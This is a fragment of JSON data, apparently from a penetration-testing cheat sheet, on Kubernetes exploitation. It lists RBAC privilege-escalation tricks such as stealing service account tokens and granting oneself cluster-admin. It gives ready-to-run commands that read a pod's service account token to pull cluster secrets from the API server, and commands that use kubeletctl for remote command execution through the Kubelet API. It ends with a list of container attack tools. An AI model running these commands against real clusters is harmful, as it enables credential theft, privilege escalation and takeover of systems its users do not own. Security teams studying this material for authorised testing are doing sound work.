        {
            "heading": "Kubernetes Exploitation",
            "subheadings": [
                {
                    "heading": "RBAC Privilege Escalation",
                    "type": "list",
                    "content": [
                        "Abuse `pods/exec` to gain shell access to sensitive containers",
                        "Abuse `secrets` read access to steal service account tokens",
                        "Identify `impersonate` permissions to take over administrative accounts",
                        "Look for `create rolebindings` to grant yourself `cluster-admin` privileges"
                    ]
                },
                {
                    "heading": "Service Account Token Abuse",
                    "type": "code_block",
                    "content": [
                        "# Locate token in pod",
                        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
                        "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
                        "",
                        "# Query API server with stolen token",
                        "curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" \\",
                        "  https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
                    ]
                },
                {
                    "heading": "Kubelet API Exploitation",
                    "type": "code_block",
                    "content": [
                        "# Scan for RCE via Kubelet API (Port 10250)",
                        "kubeletctl scan rce <node-ip>",
                        "",
                        "# Execute command in pod via Kubelet",
                        "kubeletctl -s <node-ip> exec \"id\" -p <pod> -c <container>"
                    ]
                }
            ]
        },
        {
            "heading": "Tools & Security Scanners",
            "subheadings": [
                {
                    "heading": "Container & Image Scanning",
                    "type": "list",
                    "content": [
                        "[Trivy](https://github.com/aquasecurity/trivy) - Vulnerability scanner for containers and IAC",
                        "[Grype](https://github.com/anchore/grype) - Vulnerability scanner for container images",
                        "[Deepce](https://github.com/stealthcopter/deepce) - Docker enumeration and privilege escalation"
                    ]
                },
                {
                    "heading": "Kubernetes Attack Tools",
                    "type": "list",
                    "content": [
                        "[Peirates](https://github.com/inguardians/peirates) - Kubernetes penetration testing tool",
                        "[Kube-hunter](https://github.com/aquasecurity/kube-hunter) - Hunt for security issues in clusters",
                        "[CDK](https://github.com/cdk-team/CDK) - Container Dev Kit for escaping and lateral movement"
                    ]
                }
            ]
        },
